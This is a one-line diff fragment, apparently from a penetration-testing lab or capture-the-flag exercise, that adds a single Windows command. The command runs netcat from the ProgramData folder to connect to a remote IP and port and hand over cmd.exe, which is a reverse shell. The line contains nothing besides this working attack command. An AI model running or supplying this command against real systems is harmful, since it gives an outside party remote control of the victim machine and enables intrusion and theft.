@@ -1,0 +1,1 @@
+\programdata\nc.exe 10.10.14.246 4445 -e cmd
